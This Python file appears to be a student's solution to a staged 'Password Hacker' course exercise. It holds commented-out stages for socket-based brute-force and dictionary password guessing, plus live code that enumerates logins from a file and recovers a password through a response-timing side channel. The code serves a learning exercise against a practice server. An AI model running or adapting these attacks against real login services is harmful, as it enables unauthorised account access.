# write your code here
import sys
import socket
import string
import itertools
import json
from datetime import datetime, timedelta

#STAGE 2
# class HackPassword:
#     PASSWORD_CHARS = ""
#
#     def __init__(self):
#         self.PASSWORD_CHARS = string.ascii_lowercase + string.digits
#
#     def password_generator(self):
#         password_length = 1
#
#         while True:
#             for password in itertools.product(self.PASSWORD_CHARS, repeat=password_length):
#                 yield password
#             password_length += 1
#
#     def hack_password(self, IP, port):
#         sock = socket.socket()
#         sock.connect((IP, port))
#         generator = self.password_generator()
#         while True:
#             password = "".join(next(generator))
#             sock.send(password.encode())
#             if sock.recv(1024).decode() == "Connection success!":
#                 print(password)
#                 break
#         sock.close()
#
#
#
# args = sys.argv
# if len(args) == 3:
#     hack = HackPassword()
#     hack.hack_password(args[1], int(args[2]))


#STAGE 1
# args = sys.argv
# if len(args) == 4:
#     sock = socket.socket()
#     sock.connect((args[1], int(args[2])))
#     sock.send(args[3].encode())
#     print(sock.recv(1024).decode())
#     sock.close()


#STAGE 3
# class HackPassword:
#
#     def password_generator(self):
#         passwords_file = open('C:\\Users\\Vlad\\PycharmProjects\\Password Hacker\\Password Hacker\\task\\hacking\\passwords.txt', "r")
#         password = passwords_file.readline().strip(" \n")
#         while len(password) != 0:
#
#             if password.isnumeric():
#                 yield password
#             else:
#                 for change_password in map(lambda x: ''.join(x), itertools.product(*([letter.lower(), letter.upper()] for letter in password))):
#                     yield change_password
#             password = passwords_file.readline().strip(" \n")
#         passwords_file.close()
#
#     def hack_password(self, IP, port):
#         sock = socket.socket()
#         sock.connect((IP, port))
#         generator = self.password_generator()
#         while True:
#             password = "".join(next(generator))
#             sock.send(password.encode())
#             if sock.recv(1024).decode() == "Connection success!":
#                 print(password)
#                 break
#         sock.close()
#
#
#
# args = sys.argv
# if len(args) == 3:
#     hack = HackPassword()
#     hack.hack_password(args[1], int(args[2]))

class HackPassword:

    def login_generator(self):
        login_file = open('C:\\Users\\Vlad\\PycharmProjects\\Password Hacker\\Password Hacker\\task\\hacking\\logins.txt', "r")
        login = login_file.readline().strip(" \n")
        while len(login) != 0:
            yield json.dumps({"login": login, "password": ""})
            login = login_file.readline().strip(" \n")
        login_file.close()


    def hack_password(self, IP, port):
        sock = socket.socket()
        sock.connect((IP, port))
        generator = self.login_generator()
        data = ""
        while True:
            data = next(generator)
            sock.send(data.encode())
            if json.loads(sock.recv(1024).decode())["result"] != "Wrong login!":
                break
        data = json.loads(data)
        CHARS = string.ascii_lowercase + string.ascii_uppercase + string.digits
        password = ""
        while True:
            result = ""
            for char in CHARS:
                data["password"] = password + char

                sock.send(json.dumps(data).encode())
                start = datetime.now()
                result = json.loads(sock.recv(2048).decode())["result"]

                if (datetime.now() - start).microseconds >= 90000:
                    password += char
                    break
                elif result == "Connection success!":
                    password += char
                    break
            data["password"] = password

            if result == "Connection success!":
                print(json.dumps(data))
                break
        sock.close()



args = sys.argv
if len(args) == 3:
    hack = HackPassword()
    hack.hack_password(args[1], int(args[2]))


